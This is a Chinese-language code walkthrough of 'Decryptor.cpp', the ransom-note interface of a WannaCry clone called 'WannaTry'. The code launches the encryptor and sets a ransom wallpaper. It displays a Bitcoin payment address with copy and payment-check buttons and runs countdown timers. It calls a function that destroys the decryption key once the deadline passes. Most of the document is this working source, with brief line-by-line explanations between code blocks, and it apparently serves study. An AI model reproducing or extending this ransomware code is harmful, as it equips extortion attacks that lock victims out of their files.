---
title : 10_Decryptor
---


# Decryptor

by WL, Liu
Date : 2021-10-15

---
## 壹、簡介
用於設定視窗之相關樣式，字型或大小，所有元件的配置與格式選擇，包括所有文字、圖片、計時器與進度條，各個畫面都連結與切換，都是透過這個程式碼進行。
## 貳、程式碼
### 主視窗設定
```cpp=
// Decryptor.cpp : Defines the entry point for the application.
//

#include "framework.h"
#include "../config.h"
#include "Decryptor.h"
#include "rsctool.h"
#include "../EZCrypt/EZRC4.h"
#include <Richedit.h>
#include <CommCtrl.h>
#include <string.h>
#include <stdio.h>
#include <ShlObj.h>
#include <time.h>
#include "DecQueue.h"
#include "../Common/ezfile.h"
#include "../Common/ie.h"
#include "../WannaTry/WanaFile.h"
#include "../WannaTry/WanaProc.h"
#include "../WannaTry/WanaEncryptor.h"

#define MAX_LOADSTRING 1000

#define IDC_TIMER1 2001
#define IDC_TIMER30 2030

// Global Variables:
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name

// Forward declarations of functions included in this code module:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    DecryptorDialog(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    DecryptDialog(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    CheckPaymentDialog(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: Place code here.
    if (!StartEncryptor()) {
        return FALSE;
    }
    
```
* 第50行，當互斥鎖存在，也就是當其他相同程式存在，則直接離開，反之，則啟動其他執行緒。
```cpp=54
    // Initialize global strings
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_DECRYPTOR, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // Perform application initialization:
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_DECRYPTOR));

    MSG msg;

    // Main message loop:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}
```
* 第67行，MSG包含許多程序、訊息，例如滑鼠的移動、點擊以及如何改變視窗。
* 第70行，以loop形式接收訊息。
* 第74及第75行，按键消息轉為字符消息，並分發消息给對應的視窗。
```cpp=81
//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_DECRYPTOR));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_DECRYPTOR);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}


//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // Store instance handle in our global variable

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}


//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE: Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_CREATE:
        LoadLibrary(_T("Msftedit.dll"));
        LoadLibrary(_T("Riched32.dll"));
        DialogBox(hInst,
            MAKEINTRESOURCE(IDD_DECRYPTOR_DIALOG),
            hWnd,
            DecryptorDialog);
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

```
### 勒索對話框
```cpp=168
BOOL SetWanaDesktop(UINT rcID)
{
    PUCHAR pBuffer;
    ULONG cbBuffer = 0, cbResult;
    TCHAR szFileName[MAX_PATH + 1];
    if (!(pBuffer = AllocResource(rcID, &cbBuffer))) {
        MessageBox(NULL, _T("AllocResource"), _T("ERROR"), MB_OK);
        return FALSE;
    }
    WanaFileName(szFileName,
        _T("@WanaDecryptor@.bmp"));
    WriteBuffer(
        szFileName,
        { 0 },
        0,
        pBuffer,
        cbBuffer,
        &cbResult);
    HeapFree(GetProcessHeap(), 0, pBuffer);
    SystemParametersInfo(
        SPI_SETDESKWALLPAPER,
        0,
        szFileName,
        SPIF_UPDATEINIFILE);
    return TRUE;
}

```
* 第177行，取得點陣圖之路徑。
* 第179到第185行，存檔點陣圖。
* 第187到第191行，設定桌面圖片。
```cpp=195
BOOL UpdateRichEdit(HWND hWndRichEdit, UINT rcID)
{
    PUCHAR pMessage;
    ULONG cbMessage = 0;
    if (!(pMessage = AllocResource(rcID, &cbMessage))) {
        MessageBox(hWndRichEdit, _T("AllocResource"), _T("ERROR"), MB_OK);
        return FALSE;
    }
    if (memcmp(pMessage, "{\\rtf", 5)) {
        PEZRC4 pRC4 = new EZRC4();
        pRC4->GenKey(
            (PUCHAR)RESOURCE_PASSWORD,
            (ULONG)strlen(RESOURCE_PASSWORD));
        pRC4->Decrypt(
            (PUCHAR)pMessage, cbMessage,
            (PUCHAR)pMessage, cbMessage, &cbMessage);
        delete pRC4;
    }
    SETTEXTEX se;
    se.codepage = CP_ACP;
    se.flags = ST_DEFAULT;
    SendMessage(hWndRichEdit,
        EM_SETTEXTEX, (WPARAM)&se, (LPARAM)pMessage);
    HeapFree(GetProcessHeap(), 0, pMessage);
    return TRUE;
}

```
* 第199到第202行，配置記憶體，並將資源ID載入。
* 第204行，用RC4解密。
* 第214行，使用微軟的內碼錶。
```cpp=222
void DrawProgressBar(
    HDC hdc,
    LONG x,
    LONG y,
    LONG w,
    LONG h,
    LONG p) // percentage
{
    LONG r1 = 0, g1 = 255, b1 = 0;
    LONG r2 = 255, g2 = 0, b2 = 0;
    LONG t = h * p / 100;
    HBRUSH hBrush = (HBRUSH)GetStockObject(BLACK_BRUSH);
    SelectObject(hdc, hBrush);
    Rectangle(hdc, x, y, x + w, y + t);
    for (LONG i = t; i < h; i++) {
        LONG r = i * (r2 - r1) / h + r1;
        LONG g = i * (g2 - g1) / h + g1;
        LONG b = i * (b2 - b1) / h + b1;
        HPEN hPen = CreatePen(PS_SOLID, 1, RGB(r, g, b));
        SelectObject(hdc, hPen);
        MoveToEx(hdc, x, y + i, NULL);
        LineTo(hdc, x + w, y + i);
        DeleteObject(hPen);
    }
    return;
}


```
* 第230行，綠色。
* 第231行，紅色。
* 第232行，計算黑色完成部分的大小的百分比。
* 第233行，預設的黑色筆刷。
* 第237到第239行，分別計算現在的RGB。
* 第240行，以上述RGB創造畫筆。
* 第243行，畫出線條。
* 第244行，刪除畫筆。
```cpp=250
BOOL SetDateTime(
    HWND hWndDateTime,
    time_t* t)
{
    TCHAR szMessage[1024];
    tm st;
    localtime_s(&st, t);
    _stprintf_s(szMessage,
        sizeof(szMessage) / sizeof(TCHAR),
        _T("%d/%d/%d %02d:%02d:%02d"),
        st.tm_mon + 1,
        st.tm_mday,
        st.tm_year + 1900,
        st.tm_hour,
        st.tm_min,
        st.tm_sec);
    SetWindowText(hWndDateTime, szMessage);
    return TRUE;
}

```
* 第256行，將time_t轉成tm結構。
* 第266行，設定文字型別。
```cpp=270
BOOL SetTimeLeft(
    HWND hWndTime,
    time_t nSec)
{
    TCHAR pchTimeLeft[16];
    time_t sec = nSec % 60;
    time_t min = nSec / 60;
    time_t hour = min / 60;
    min %= 60;
    time_t days = hour / 24;
    hour %= 24;
    _stprintf_s(pchTimeLeft,
        sizeof(pchTimeLeft) / sizeof(TCHAR),
        _T("%02d:%02d:%02d:%02d"),
        (INT)days, (INT)hour, (INT)min, (INT)sec);
    SetWindowText(hWndTime, pchTimeLeft);
    return TRUE;
}
```
* 第270到第287行，剩於時間，並將其轉換成天、時、分與秒。
* 第275行，計算秒數。
* 第276及第278行，計算分鐘數。
* 第277及第280行，計算時數。
* 第279行，計算天數。
```cpp=288
// Message handler for Decryptor Dialog.
INT_PTR CALLBACK DecryptorDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    static TCHAR BitcoinNumber[] =
        _T("115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn");
    static HBRUSH hBkBrush = NULL;
    static HFONT hFont12B = NULL;
    static HFONT hFont12BU = NULL;
    static HFONT hFont14BU = NULL;
    static HFONT hFont16B = NULL;
    static HFONT hFont18BU = NULL;
    static HFONT hFont20B = NULL;
    static HFONT hFont26B = NULL;
    static HFONT hFont30B = NULL;
    static HFONT hFont24T = NULL;
    static HWND hWndEdit = NULL;
    static HWND hWndCombo = NULL;
    static HWND hWndRichEdit = NULL;
    static HWND hWndDate1 = NULL;
    static HWND hWndDate2 = NULL;
    static HWND hWndCountDown1 = NULL;
    static HWND hWndCountDown2 = NULL;
    static HWND hWndProgress1 = NULL;
    static HWND hWndProgress2 = NULL;
    static RESDATA ResData;
    static time_t TimeLeft1, TimeLeft2;
    static struct ComboBoxItem {
        ULONG rcID;
        CONST LPCTSTR str;
    } ComboItems[]{
        { IDR_MSG_BULGARIAN, _T("Bulgarian") },
        { IDR_MSG_CHINESE_SIMPLIFIED,
            _T("Chinese, (Simplified)")  },
        { IDR_MSG_CHINESE_TRADITIONAL,
            _T("Chinese, (Traditional)")  },
        { IDR_MSG_CROATIAN, _T("Croatian") },
        { IDR_MSG_CZECH, _T("Czech") },
        { IDR_MSG_DANISH, _T("Danish") },
        { IDR_MSG_DUTCH, _T("Dutch") },
        { IDR_MSG_ENGLISH, _T("English") },
        { IDR_MSG_FILIPINO, _T("Filipino") },
        { IDR_MSG_FINNISH, _T("Finnish") },
        { IDR_MSG_FRENCH, _T("French") },
        { IDR_MSG_GERMAN, _T("German") },
        { IDR_MSG_GREEK, _T("Greek") },
        { IDR_MSG_INDONESIAN, _T("Indonesian") },
        { IDR_MSG_ITALIAN, _T("Italian") },
        { IDR_MSG_JAPANESE, _T("Japanese") },
        { IDR_MSG_KOREAN, _T("Korean") },
        { IDR_MSG_LATVIAN, _T("Latvian") },
        { IDR_MSG_NORWEGIAN, _T("Norwegian") },
        { IDR_MSG_POLISH, _T("Polish") },
        { IDR_MSG_PORTUGUESE, _T("Portuguese") },
        { IDR_MSG_ROMANIAN, _T("Romanian") },
        { IDR_MSG_RUSSIAN, _T("Russian") },
        { IDR_MSG_SLOVAK, _T("Slovak") },
        { IDR_MSG_SPANISH, _T("Spanish") },
        { IDR_MSG_SWEDISH, _T("Swedish") },
        { IDR_MSG_TURKISH, _T("Turkish") },
        { IDR_MSG_VIETNAMESE, _T("Vietnamese") },
        {0, nullptr}
    };
    static UINT nDefaultComboItem = 2;
```
* 第294到第351行，使用static，將其儲存在靜態資料區，這會使變數會在程式一開始執行完成初始化，這可以保持變數內容的持久，這些變數在後面的程式碼，只要呼叫對話框時就會使用到。
* 第314行，為兩個計時器，分別為剩餘優惠時間與剩餘解密時間。
* 第319到第349行，為語言選項。
* 第351行，設定為2，即預設為繁體中文。
```cpp=352
    switch (message)
    {
    case WM_INITDIALOG:
    {
        hBkBrush = CreateSolidBrush(RGB(128, 0, 0));
        // create fonts
        hFont12B = DefaultFont(12, FALSE);
        hFont12BU = DefaultFont(12, TRUE);
        hFont14BU = DefaultFont(14, TRUE);
        hFont16B = DefaultFont(16, FALSE);
        hFont18BU = DefaultFont(18, TRUE);
        hFont20B = DefaultFont(20, FALSE);
        hFont26B = DefaultFont(26, FALSE);
        hFont30B = DefaultFont(30, FALSE);
        hFont24T = CreateFont(24, 0, 0, 0,
            FW_DONTCARE, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_RASTER_PRECIS,
            CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
            VARIABLE_PITCH, _T("Terminal"));
        // set font of components
        SetDlgItemFont(IDC_CHECKPAYMENT_BUTTON, hFont26B);
        SetDlgItemFont(IDC_DECRYPT_BUTTON, hFont26B);
        SetDlgItemFont(IDC_OOOPS_STATIC, hFont26B);
        SetDlgItemFont(IDC_FILELOST_STATIC, hFont16B);
        SetDlgItemFont(IDC_DEADLINE_STATIC, hFont16B);
        SetDlgItemFont(IDC_DEADTIMELEFT_STATIC, hFont16B);
        SetDlgItemFont(IDC_DEADCOUNTDOWN_STATIC, hFont24T);
        SetDlgItemFont(IDC_PAYMENTRAISE_STATIC, hFont16B);
        SetDlgItemFont(IDC_DATETIME_STATIC, hFont16B);
        SetDlgItemFont(IDC_RAISETIMELEFT_STATIC, hFont16B);
        SetDlgItemFont(IDC_RAISECOUNTDOWN_STATIC, hFont24T);
        SetDlgItemFont(IDC_COMTACTUS_STATIC, hFont18BU);
        SetDlgItemFont(IDC_HOWTOBUY_STATIC, hFont12BU);
        SetDlgItemFont(IDC_ABOUTBITCOIN_STATIC, hFont14BU);
        SetDlgItemFont(IDC_SENDBITCOIN_STATIC, hFont20B);
        SetDlgItemFont(IDC_COPY_BUTTON, hFont12B);
        SetDlgItemFont(IDC_EDIT1, hFont20B);
        SetDlgItemFont(IDC_COMBO1, hFont12B);
        // get HWNDs
        hWndEdit = GetDlgItem(hDlg, IDC_EDIT1);
        hWndCombo = GetDlgItem(hDlg, IDC_COMBO1);
        hWndRichEdit = GetDlgItem(hDlg, IDC_RICHEDIT21);
        hWndDate1 = GetDlgItem(hDlg, IDC_DEADLINE_STATIC);
        hWndDate2 = GetDlgItem(hDlg, IDC_DATETIME_STATIC);
        hWndCountDown1 = GetDlgItem(hDlg, IDC_DEADCOUNTDOWN_STATIC);
        hWndCountDown2 = GetDlgItem(hDlg, IDC_RAISECOUNTDOWN_STATIC);
        hWndProgress1 = GetDlgItem(hDlg, IDC_PROGRESS1_STATIC);
        hWndProgress2 = GetDlgItem(hDlg, IDC_PROGRESS2_STATIC);
        // bitcoin
        SendMessage(hWndEdit,
            WM_SETTEXT, (WPARAM)TRUE,
            (LPARAM)BitcoinNumber);
        // get start time
        ReadResFile(&ResData);
        if (!ResData.m_StartTime) {
            ResData.m_StartTime = (DWORD)time(NULL);
            ResData.m_EndTime = (DWORD)time(NULL);
        }
        time_t CurTime = GetDecryptFlag() ?
            ResData.m_EndTime : time(NULL);
        WriteResFile(&ResData);
        // count down
        time_t st1, st2;
        st1 = ResData.m_StartTime + FINAL_COUNTDOWN;
        st2 = ResData.m_StartTime + PRICE_COUNTDOWN;
        SetDateTime(hWndDate1, &st1);
        SetDateTime(hWndDate2, &st2);
        TimeLeft1 = st1 > CurTime ? st1 - CurTime : 0;
        TimeLeft2 = st2 > CurTime ? st2 - CurTime : 0;
        SetTimeLeft(hWndCountDown1, TimeLeft1);
        SetTimeLeft(hWndCountDown2, TimeLeft2);
        // initialize timers
        SetTimer(hDlg,
            IDC_TIMER1,
            1000,
            (TIMERPROC)NULL);
        SetTimer(hDlg,
            IDC_TIMER30,
            30000,
            (TIMERPROC)NULL);
        // add items into combobox
        for (INT i = 0; ComboItems[i].rcID; i++) {
            SendMessage(hWndCombo, (UINT)CB_ADDSTRING,
                (WPARAM)0, (LPARAM)ComboItems[i].str);
        }
        SendMessage(hWndCombo, CB_SETCURSEL,
            (WPARAM)nDefaultComboItem, (LPARAM)0);
        // update richedit
        UpdateRichEdit(hWndRichEdit, ComboItems[nDefaultComboItem].rcID);
        // set desktop
        SetWanaDesktop(IDB_BITMAP3);
        return (INT_PTR)TRUE;
    }
```
* 第358到第366行，各種對話框會用到的字型樣式，例如:第358行，12字型加底線。
* 第391到第399行，取得各元件之HWND。
* 第401到第404行，若收到訊息時，就編輯文件內容。
* 第405行，將開始閱讀檔案設為開始時間，從000000000.res取得。
* 第415行，計算最後期限。
* 第416行，計算最後優惠期限。
* 第417及第418行，分別輸出第415及第416行計算之時間。
* 第419行，計算最後期限剩餘秒數。
* 第420行，計算最後優惠期限剩餘秒數。
* 第424到第427行，建立以秒為單位的計時器。
* 第428到第431行，建立以30秒為單位的計時器。
```cpp=445
    case WM_COMMAND:
    {
        int wmId = LOWORD(wParam);
        switch (wmId)
        {
        case IDC_DECRYPT_BUTTON:
            DialogBox(hInst,
                MAKEINTRESOURCE(IDD_DECRYPT_DIALOG),
                hDlg,
                DecryptDialog);
            break;
        case IDC_CHECKPAYMENT_BUTTON:
            DialogBox(hInst,
                MAKEINTRESOURCE(IDC_CHECKPAYMENT_DIALOG),
                hDlg,
                CheckPaymentDialog);
            break;
        case IDC_ABOUTBITCOIN_STATIC:
            LaunchIE((LPTSTR)_T("https://en.wikipedia.org/wiki/Bitcoin"));
            break;
        case IDC_HOWTOBUY_STATIC:
            LaunchIE((LPTSTR)_T("https://www.google.com/search?q=how+to+buy+bitcoin"));
            break;
        case IDC_COMTACTUS_STATIC:
            MessageBox(hDlg, _T("Contact Us"), _T("TODO"), MB_OK);
            break;
        case IDC_COMBO1:
            if (HIWORD(wParam) == CBN_SELCHANGE) {
                INT ItemIndex = (INT)SendMessage((HWND)lParam,
                    (UINT)CB_GETCURSEL, (WPARAM)0, (LPARAM)0);
                BOOL result = UpdateRichEdit(
                    hWndRichEdit,
                    ComboItems[ItemIndex].rcID);
            }
            break;
```
* 第450到第455行，產生解密對話框。
* 第456到第461行，產生Check Payment對話框。
* 第462及第465行，開啟IE顯示網頁，前者為關於比特幣，後者為如何購買比特幣之相關網頁。
* 第471行，收到組合框選項之訊息時執行。
* 第473到第477行，取得選擇項目並更新之。
```cpp=480
        case IDC_COPY_BUTTON:
        {
            HGLOBAL hMem = GlobalAlloc(
                GMEM_MOVEABLE,
                sizeof(BitcoinNumber));
            if (hMem) {
                OpenClipboard(hDlg);
                EmptyClipboard();
                LPTSTR pMem = (LPTSTR)GlobalLock(hMem);
                CopyMemory(pMem,
                    BitcoinNumber,
                    sizeof(BitcoinNumber));
                GlobalUnlock(hMem);
                SetClipboardData(
                    CF_UNICODETEXT,
                    hMem);
                CloseClipboard();
            }
            break;
        }
        }
        break;
    }
    case WM_TIMER:
    {
        if (GetDecryptFlag() || TimeLeft1 <= 0) {
            KillTimer(hDlg, IDC_TIMER1);
            KillTimer(hDlg, IDC_TIMER30);
            break;
        }
        switch (wParam)
        {
        case IDC_TIMER1:
        {
            if (TimeLeft1 > 0) {
                TimeLeft1--;
                SetTimeLeft(hWndCountDown1, TimeLeft1);
            }
            else if (!GetDecryptFlag()) {
                WanaDestroyKey();
            }
            if (TimeLeft2 > 0) {
                TimeLeft2--;
                SetTimeLeft(hWndCountDown2, TimeLeft2);
            }
            break;
        }
        case IDC_TIMER30:
        {
            //用InvalidateRect來觸發重繪
            //最後期限進度條
            InvalidateRect(hWndProgress1, NULL, TRUE);
            //優惠期限進度條
            InvalidateRect(hWndProgress2, NULL, TRUE);
            break;
        }
        }
        break;
    }
```
* 第503到第538行，計時器的設定。
* 第505到第509行，如果已經可解密或是超過最後期限，關閉並停止計時器。
* 第512及第527行，分別為以秒及以30秒為單位之計時器。
* 第519行，超過期限，銷毀解密金鑰。
* * 第531及第533行，分別為繪製最後期限與優惠期限的進度條。
```cpp=539
    case WM_CTLCOLORDLG:
        return (INT_PTR)hBkBrush;
    case WM_CTLCOLORSTATIC:
    {
        HWND hWndStatic = (HWND)lParam;
        HDC hdcStatic = (HDC)wParam;
        UINT rcID = GetWindowLong(hWndStatic, GWL_ID);
        INT_PTR hBrush = (INT_PTR)GetStockObject(WHITE_BRUSH);
        // set background
        if (rcID != IDC_EDIT1) {
            SetBkColor(hdcStatic, RGB(128, 0, 0));
            hBrush = (INT_PTR)hBkBrush;
        }
        // set text color
        switch (rcID) {
        // case IDC_CHECKPAYMENT_BUTTON:
        // case IDC_COMBO1:
        // case IDC_COPY_BUTTON:
        // case IDC_DECRYPT_BUTTON:
        case IDC_EDIT1:
            SetTextColor(hdcStatic, RGB(0, 0, 0));
            break;
        case IDC_ABOUTBITCOIN_STATIC:
        case IDC_COMTACTUS_STATIC:
        case IDC_HOWTOBUY_STATIC:
            SetTextColor(hdcStatic, RGB(120, 120, 255));
            break;
        case IDC_FILELOST_STATIC:
        case IDC_PAYMENTRAISE_STATIC:
        case IDC_SENDBITCOIN_STATIC:
            SetTextColor(hdcStatic, RGB(255, 255, 0));
            break;
        case IDC_PROGRESS1_STATIC:
        {
            RECT rect;
            GetClientRect(hWndStatic, &rect);
            DrawProgressBar(hdcStatic,
                rect.left,
                rect.top,
                rect.right,
                rect.bottom,
                (INT)(time(NULL) - ResData.m_StartTime)
                * 100 / FINAL_COUNTDOWN);
            break;
        }
        case IDC_PROGRESS2_STATIC:
        {
            RECT rect;
            GetClientRect(hWndStatic, &rect);
            DrawProgressBar(hdcStatic,
                rect.left,
                rect.top,
                rect.right,
                rect.bottom,
                (INT)(time(NULL) - ResData.m_StartTime)
                * 100 / PRICE_COUNTDOWN);
            break;
        }
        default:
            SetTextColor(
                hdcStatic,
                RGB(255, 255, 255));
            break;
        }
        return hBrush;
    }
```
* 第548到第550行，除了元件外，背景都設為紅色。
* 第558行，黑色文字。
* 第563行，紫色文字。
* 第568行，黃色文字。
* 第575到第582行，繪出漸層條。
* 第580及第581行，計算完成百分比。
* 第598行，白色文字。
```cpp=605
    case WM_CTLCOLORBTN:
    {
        HWND hWndButton = (HWND)lParam;
        HDC hdcButton = (HDC)wParam;
        SetBkColor(hdcButton, RGB(128, 0, 0));
        return (INT_PTR)hBkBrush;
    }
    case WM_CLOSE:
        DeleteObject(hBkBrush);
        DeleteObject(hFont12B);
        DeleteObject(hFont12BU);
        DeleteObject(hFont14BU);
        DeleteObject(hFont16B);
        DeleteObject(hFont18BU);
        DeleteObject(hFont20B);
        DeleteObject(hFont26B);
        DeleteObject(hFont30B);
        DeleteObject(hFont24T);
        PostQuitMessage(0);
        return (INT_PTR)TRUE;
    default:
        break;
    }
    return (INT_PTR)FALSE;
}

```
* 第612到第629行，收到WM_CLOSE後，刪除之前產生的筆刷與字型。
### 解密對話框
```cpp=631
// Message handler for Decrypt Dialog.
INT_PTR CALLBACK DecryptDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    static HBRUSH hBkBrush = NULL;
    static HFONT hFont = NULL;
    static HANDLE hThread = NULL;
    static BOOL bStartFlag = FALSE;
    static PDECQUEUE pDecQueue = NULL;
    static DWORD nDirs = 0, nFiles = 0;
    static DWORD64 nFileSize = 0;
    static HWND hWndCombo, hWndList, hWndStart;
    static LPTSTR StartFolder = NULL;
    static struct DirSelect {
        LPCTSTR DisplayName;
        REFKNOWNFOLDERID ID;
    } KnownFolders[] = {
    {_T("My Computer"), FOLDERID_ComputerFolder },
    {_T("Desktop"), FOLDERID_Desktop},
    {_T("Downloads"), FOLDERID_Downloads},
    {_T("Documents"), FOLDERID_Documents},
    {_T("Pictures"), FOLDERID_Pictures},
    {_T("Music"), FOLDERID_Music},
    {_T("Videos"), FOLDERID_Videos},
    {NULL, FOLDERID_Windows} // end of list
    };
```
* 第630到第656行，製作解密目錄，static使用原因如前述。
* 第644到第656行，定義7個目錄的選項，可讓其選擇優先解密的項目。
```cpp=657
    switch (message)
    {
    case WM_INITDIALOG:
        hBkBrush = CreateSolidBrush(RGB(128, 0, 0));
        hFont = DefaultFont(16, FALSE);
        SetDlgItemFont(IDC_SELECTHOST_STATIC, hFont);
        SetDlgItemFont(IDC_FILELIST_LIST, hFont);
        SetDlgItemFont(IDD_DECRYPT_COMBOBOX, hFont);
        SetDlgItemFont(IDC_START_BUTTON, hFont);
        SetDlgItemFont(IDC_CLIPBOARD_BUTTON, hFont);
        SetDlgItemFont(IDC_CLOSE_BUTTON, hFont);
        hWndList = GetDlgItem(hDlg, IDC_FILELIST_LIST);
        hWndCombo = GetDlgItem(hDlg, IDD_DECRYPT_COMBOBOX);
        hWndStart = GetDlgItem(hDlg, IDC_START_BUTTON);
        nDirs = 0;     //變數初始化
        nFiles = 0;     //變數初始化
        nFileSize = 0;     //變數初始化
        for (INT i = 0; KnownFolders[i].DisplayName; i++) {
            SendMessage(hWndCombo,
                CB_ADDSTRING,
                (WPARAM)0,
                (LPARAM)KnownFolders[i].DisplayName);
        }
        SendMessage(hWndCombo, CB_SETCURSEL,
            (WPARAM)0, (LPARAM)0);
        return (INT_PTR)TRUE;
```
* 第659到第682行，設定解密視窗樣式。
* 第660行，產生紅色筆刷並作為背景使用。
* 第661行，用DefaultFont產生字型，並設定大小為16。
* 第662到第667行，將所有控制元件字型都設為第661行所設。
```cpp=683
    case WM_COMMAND:
    {
        int wmId = LOWORD(wParam);
        // Parse the menu selections:
        switch (wmId)
        {
        case IDD_DECRYPT_COMBOBOX:
            if (HIWORD(wParam) == CBN_SELCHANGE) {
                INT ItemIndex = (INT)SendMessage((HWND)lParam,
                    (UINT)CB_GETCURSEL, (WPARAM)0, (LPARAM)0);
                if (ItemIndex == 0) {
                    StartFolder = NULL;
                }
                else {
                    SHGetKnownFolderPath(
                        KnownFolders[ItemIndex].ID,
                        0,
                        NULL,
                        &StartFolder);
                }
            }
            break;
```
* 第689到第704行，為當收到組合框訊息時運行。
* 第691及第692行，以SendMessage將CB_GETCURSEL得到之訊息傳送給ComboBox，以獲取選擇的選項。
* 第693行，如果選擇為0，則表示是為全電腦解密。
* 第696到第702行，如果選擇到其他結果，利用SHGetKnownFolderPath來取得路徑
```cpp=705
        case IDC_START_BUTTON:
            if (!bStartFlag) {
                pDecQueue = new DECQUEUE(hDlg);
                pDecQueue->m_Start = StartFolder;
                hThread = CreateThread(
                    NULL,
                    0,
                    DecQueueThread,
                    pDecQueue,
                    0,
                    NULL);
                if (hThread) {
                    CloseHandle(hThread);
                    hThread = NULL;
                }
                SetWindowText(hWndStart, _T("Cancel"));
                bStartFlag = TRUE;
            }
            else {
                pDecQueue->Stop();
                SetWindowText(hWndStart, _T("Start"));
                bStartFlag = FALSE;
            }
            break;
```
* 第705到第728行，設定開始按鈕。
* 第721及第726行，當按下開始後，「Start」變成「Cancel」;相反的，從再次按下後，再由「Cancel」轉變回「Start」。
* 第707到第721行，開始解密。
* 第724到第726行，中斷解密，pDecQueue->Stop傳送「停止」給執行緒。
```cpp=729
        case IDC_CLIPBOARD_BUTTON:
        {
            DWORD nCch = (DWORD)(nFileSize + nFiles * 2 + 10);
            HGLOBAL hMem = GlobalAlloc(
                GMEM_MOVEABLE,
                sizeof(TCHAR) * nCch);
            if (hMem) {
                OpenClipboard(hDlg);     //開啟剪貼簿
                EmptyClipboard();     //清空剪貼簿
                LPTSTR aFileNames = (LPTSTR)GlobalLock(hMem);
                aFileNames[0] = _T('\0');
                for (DWORD i = 0; i < nFiles; i++) {
                    TCHAR aFileName[MAX_PATH + 1];
                    SendMessage(
                        hWndList,
                        LB_GETTEXT, i,
                        (LPARAM)aFileName);
                    _tcscat_s(aFileNames, nCch, aFileName);
                    _tcscat_s(aFileNames, nCch, _T("\r\n"));
                }
                GlobalUnlock(hMem);
                SetClipboardData(CF_UNICODETEXT, hMem);
                CloseClipboard();
                hMem = NULL;
            }
            break;
        }
```
* 第731行，每個檔名之間有"\r\n"，故加上nFile * 2，並補上額外的10，作為保險用通常不會用到。
* 第732到第734行，以GlobalAlloc配置記憶體。
* 第742到第745行，將訊息、索引及檔名存放地址，傳送給ListBox，ListBox便會將檔名到位址上去。
```cpp=756
        case IDC_CLOSE_BUTTON:
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    case WM_USER:
    {
        switch (wParam) {
        case IDC_DECQUEUE_DATA:
        {
            TCHAR szName[MAX_PATH + 1];
            DWORD dwAttributes;
            pDecQueue->RecvData(szName, &dwAttributes);
            if (dwAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                nDirs++;
            }
            else {
                nFiles++;
                SendMessage(hWndList,
                    LB_ADDSTRING,
                    (WPARAM)0,
                    (LPARAM)szName);
                SendMessage(hWndList,
                    LB_SETCURSEL,
                    (WPARAM)(nFiles - 1),
                    (LPARAM)0);
                nFileSize += (ULONG)_tcslen(szName) + 1;
            }
            break;
        }
```
* 第764及第765行，當收到執行緒回傳時執行。
* 第769行，取得檔名及檔案屬性。
* 第770到第772行，接收目錄，並紀錄接收目錄數量。
